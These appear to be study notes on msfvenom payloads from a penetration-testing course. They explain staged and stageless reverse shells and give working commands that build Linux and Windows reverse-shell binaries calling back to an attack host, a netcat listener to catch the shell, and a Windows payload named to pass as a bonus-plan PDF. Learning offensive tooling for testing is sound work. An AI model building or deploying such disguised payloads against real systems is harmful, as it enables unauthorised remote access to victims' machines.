- We can issue the command msfvenom -l payloads to **list all the available payloads**:
	- `msfvenom -l payloads`

# Staged vs. Stageless Payloads
---
- Staged payloads create a way for us to **send over more components of our attack**. We can think of it like we are "setting the stage" for something even more useful. 
- Take for example this payload `linux/x86/shell/reverse_tcp`. 
- When run using an exploit module in Metasploit, **this payload will send a small stage that will be executed on the target and then call back to the attack box to download the remainder of the payload** over the network, then executes the shellcode to establish a reverse shell.
- So `/shell/` is a stage to send, and `/reverse_tcp` is another.


- `Stageless` payloads do not have a stage. Take for example this payload `linux/zarch/meterpreter_reverse_tcp`.
- This payload will be sent in its **entirety across a network connection without a stage.**
- This could benefit us in environments w**here we do not have access to much bandwidth and latency can interfere.**
- Stageless payloads **can sometimes be better for evasion purposes due to less traffic passing over the network to execute the payload**

# Building A Stageless Payload
---
- `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf`
- We would have a listener ready to catch the connection on the attack box side upon successful execution:
	- `sudo nc -lvnp 443`
# Building a simple Stageless Payload for a Windows system
---
- `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe`